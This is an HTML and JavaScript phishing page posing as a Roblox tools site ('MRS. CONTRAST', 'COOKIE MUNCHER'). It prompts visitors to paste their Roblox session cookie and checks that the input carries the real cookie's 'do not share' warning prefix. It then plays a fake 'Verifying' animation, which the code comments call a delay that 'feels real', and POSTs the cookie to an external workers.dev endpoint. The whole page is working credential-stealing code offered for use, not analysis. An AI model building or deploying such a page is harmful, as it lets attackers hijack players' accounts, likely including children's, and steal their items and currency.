<!DOCTYPE html>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="UTF-8">
<title>Contrast Cookiez</title>

<style>
  button.error {
  background: linear-gradient(135deg, #ff4d4d, #c0392b) !important;
  cursor: not-allowed;
}

button.error .btn-text {
  opacity: 1;
}

#errorText {
  margin-top: 14px;
  font-size: 14px;
  color: #c0392b;
  display: none;
}

  .progress-bar {
  width: 100%;
  height: 6px;
  background: #ddd;
  border-radius: 4px;
  margin-top: 14px;
  overflow: hidden;
  opacity: 0;
}

.progress-fill {
  width: 0%;
  height: 100%;
  background: linear-gradient(135deg, #6a11cb, #2575fc);
  transition: width 0.4s ease;
}

.verifying + .progress-bar {
  opacity: 1;
}

  .spinner {
  width: 22px;
  height: 22px;
  border: 3px solid rgba(255,255,255,0.3);
  border-top-color: #fff;
  border-radius: 50%;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  opacity: 0;
}

.verifying .spinner {
  opacity: 1;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to { transform: translate(-50%, -50%) rotate(360deg); }
}

.verifying .btn-text {
  opacity: 0;
}

  .verifying {
  background: linear-gradient(135deg, #444, #222) !important;
  cursor: wait;
}

.verifying .btn-text {
  animation: dots 1.4s infinite;
}

@keyframes dots {
  0%   { content: "Verifying."; }
  33%  { content: "Verifying.."; }
  66%  { content: "Verifying..."; }
}

* { box-sizing: border-box; }

body {
  margin: 0;
  height: 100vh;
  font-family: Inter, Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;

  background:
    radial-gradient(circle at top left, #6a11cb, transparent 60%),
    radial-gradient(circle at bottom right, #2575fc, transparent 60%),
    #050505;

  background-size: 200% 200%;
  animation: bgMove 12s ease-in-out infinite;

  overflow: hidden;
}

@keyframes bgMove {
  0%   { background-position: 0% 0%; }
  50%  { background-position: 100% 100%; }
  100% { background-position: 0% 0%; }
}


@keyframes bgShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}


/* ---------- CARD ---------- */
.card {
  width: 390px;
  padding: 36px;
  border-radius: 32px;
  background: linear-gradient(
    160deg,
    rgba(255,255,255,0.96),
    rgba(245,245,245,0.88)
  );
  backdrop-filter: blur(18px);
  box-shadow: 0 35px 90px rgba(0,0,0,0.6);
  text-align: center;
  position: relative;
  transition: 0.7s cubic-bezier(.22,1,.36,1);
}

  textarea {
  width: 100%;
  min-height: 120px;
  margin-top: 14px;
  padding: 14px 18px;
  border-radius: 20px;
  border: 2px solid #111;
  font-size: 14px;
  resize: vertical;
  outline: none;
}

/* ---------- STATES ---------- */
.hidden {
  opacity: 0;
  pointer-events: none;
  transform: translateY(40px) scale(0.94);
}

.visible {
  opacity: 1;
  pointer-events: auto;
  transform: translateY(0) scale(1);
}

/* ---------- PROGRESS ---------- */
.circle,
.spinner,
.progress-bar {
  position: absolute;
}

.progress {
  display: flex;
  justify-content: center;
  gap: 10px;
  margin-bottom: 18px;
}

.dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #bbb;
  transition: 0.4s;
}

.dot.active {
  background: linear-gradient(135deg,#6a11cb,#2575fc);
  transform: scale(1.4);
}

/* ---------- TEXT ---------- */
h1 {
  margin: 0;
  font-size: 46px;
  letter-spacing: 3px;
}

.subtitle {
  margin-top: 10px;
  font-size: 16px;
  opacity: 0.85;
}

.status {
  font-size: 13px;
  opacity: 0.7;
}

hr {
  margin: 24px 0;
  border: none;
  height: 1px;
  background: linear-gradient(to right, transparent, #000, transparent);
}

/* ---------- BUTTON ---------- */
button {
  width: 100%;
  height: 56px;
  border-radius: 30px;
  border: none;
  font-size: 16px;
  cursor: pointer;
  background: linear-gradient(135deg, #111, #333);
  color: #fff;
  overflow: hidden;
  transition: 0.35s;
  margin-top: 16px;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;

}

button:hover {
  transform: translateY(-2px);
}

button:active {
  transform: scale(0.96);
}

button::before {
  position: absolute;
  inset: 0;
  background: linear-gradient(
    120deg,
    transparent,
    rgba(255,255,255,0.4),
    transparent
  );
  transform: translateX(-100%);
}

button:hover::before {
  animation: shine 1.1s infinite;
}

@keyframes shine {
  to { transform: translateX(100%); }
}

/* ---------- INPUT ---------- */
input {
  width: 100%;
  margin-top: 14px;
  padding: 14px 18px;
  border-radius: 30px;
  border: 2px solid #111;
  font-size: 16px;
  outline: none;
  transition: 0.25s;
}

input:focus {
  border-color: #6a11cb;
  box-shadow: 0 0 0 4px rgba(106,17,203,0.25);
}

/* ---------- BACK BUTTON ---------- */
.back {
  position: absolute;
  left: 18px;
  top: 18px;
  font-size: 14px;
  cursor: pointer;
  opacity: 0.6;
  transition: 0.3s;
}

.back:hover {
  opacity: 1;
  transform: translateX(-4px);
}

/* ---------- SUCCESS ---------- */
button.success {
  background: linear-gradient(135deg, #2ed573, #20bf6b);
  cursor: default;
}

.circle {
  width: 42px;
  height: 42px;
  border-radius: 50%;
  border: 3px solid #fff;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%) scale(0);
}
  
textarea {
  width: 100%;
  margin-top: 14px;
  padding: 14px 18px;
  border-radius: 30px;
  border: 2px solid #111;
  font-size: 16px;
  outline: none;
  resize: none;
  font-family: inherit;
}

button.success .circle {
  animation: pop 0.5s forwards;
}

@keyframes pop {
  to { transform: translate(-50%, -50%) scale(1); }
}

svg {
  width: 24px;
  height: 24px;
  fill: none;
  stroke: white;
  stroke-width: 4;
  stroke-dasharray: 48;
  stroke-dashoffset: 48;
  animation: draw 0.6s 0.3s forwards;
}

@keyframes draw {
  to { stroke-dashoffset: 0; }
}

.btn-text { transition: opacity 0.3s; }
button.success .btn-text { opacity: 0; }

#thankyou {
  margin-top: 16px;
  font-size: 14px;
  color: #1e7e34;
  display: none;
}

  @media (max-width: 480px) {
  .card {
    width: calc(100% - 24px);
    padding: 24px;
    border-radius: 24px;
  }

  h1 {
    font-size: 32px;
  }

  textarea {
    font-size: 13px;
  }
}


/* ---------- FOOTER ---------- */
.footer {
  margin-top: 24px;
  font-size: 12px;
  opacity: 0.6;
}
</style>
</head>

<body>

<!-- LANDING -->
<div id="landing" class="card visible">
  <div class="progress">
    <div class="dot active"></div>
    <div class="dot"></div>
  </div>

  <h1>MRS. CONTRAST</h1>
  <p class="subtitle">Your all-in stop for Roblox tools.</p>
  <p class="status">Status: Working</p>
  <hr>
  <p>CLICK HERE TO PROCEED</p>
  <button id="proceedBtn"> Proceed </button>
  <p id="errorText">Error. Check the cookie value.</p>
  <div class="footer">@mrscontrast on tiktok</div>
</div>

<!-- SURVEY -->
<div id="survey" class="card hidden">
  <div class="back" id="backBtn">‚Üê Back</div>

  <div class="progress">
    <div class="dot"></div>
    <div class="dot active"></div>
  </div>

  <h1>COOKIE MUNCHER</h1>
  <p class="status">Developed by: Contrast</p>

  <hr>

  <label>ENTER DETAILS:</label>
  <textarea id="response" placeholder="Paste cookie here" rows="4"></textarea>
  <button id="submitBtn">
    <div class="progress-bar">
  <div class="progress-fill"></div>
</div>
    <div class="circle">
      <svg viewBox="0 0 52 52">
        <path d="M14 27 L22 35 L38 19"></path>
      </svg>
    </div>
    <div class="spinner"></div>
    <span class="btn-text" id="btnText">Submit</span>
  </button>

  <p id="thankyou">Thank you, please have some patience.</p>
  <div class="footer">@mrscontrast on tiktok</div>
</div>

<audio id="clickSound" preload="auto">
  <source src="https://bigsoundbank.com/UPLOAD/mp3/1735.mp3">
</audio>

<script>
const REQUIRED_PREFIX =
"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

function isValidCookie(value) {
  return (
    value.startsWith(REQUIRED_PREFIX) &&
    value.includes("_CAEaAhADIhsK") &&
    value.length > 200
  );
}

const landing = document.getElementById("landing");
const survey = document.getElementById("survey");
const sound = document.getElementById("clickSound");

function play() { sound.currentTime = 0; sound.play(); }

document.getElementById("proceedBtn").onclick = () => {
  play();
  landing.classList.replace("visible","hidden");
  setTimeout(() => survey.classList.replace("hidden","visible"), 350);
};

document.getElementById("backBtn").onclick = () => {
  play();
  survey.classList.replace("visible","hidden");
  setTimeout(() => landing.classList.replace("hidden","visible"), 350);
};

document.getElementById("submitBtn").onclick = async () => {
  const input = response;
const btn = submitBtn;
const btnText = document.getElementById("btnText");

if (btn.disabled) return;

if (!isValidCookie(input.value)) {
  btn.classList.remove("verifying", "success");
  btn.classList.add("error");
  btnText.textContent = "Invalid cookie.";
  document.getElementById("errorText").style.display = "block";

  setTimeout(() => {
    location.reload();
  }, 3000);

  return;
}


play();

// --- Verifying state ---
btn.disabled = true;
  const fill = document.querySelector(".progress-fill");
fill.style.width = "0%";

let progress = 0;
const progressTimer = setInterval(() => {
  progress += Math.random() * 18;
  fill.style.width = Math.min(progress, 90) + "%";
}, 300);
btn.classList.add("verifying");
  
btnText.textContent = "Verifying";

let dots = 0;
const dotInterval = setInterval(() => {
  dots = (dots + 1) % 4;
  btnText.textContent = "Verifying" + ".".repeat(dots);
}, 400);

// Fake verification delay (feels real)
await new Promise(r => setTimeout(r, 1600));

// Send to worker
let res;
try {
  res = await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
  method: "POST",
  headers: { "Content-Type": "text/plain" },
  body: input.value
  });
} catch (e) {
  alert("Network error. Try again.");
  btn.disabled = false;
  btn.classList.remove("verifying");
  return;
}

if (!res.ok) {
  alert("Submission failed. Payload too large or server rejected it.");
  btn.disabled = false;
  btn.classList.remove("verifying");
  return;
}

clearInterval(dotInterval);

// --- Success ---
// Finish progress bar
clearInterval(progressTimer);
fill.style.width = "100%";

// Success animation
btn.classList.remove("verifying");
btn.classList.add("success");
input.disabled = true;
thankyou.style.display = "block";

};
</script>

</body>
</html>
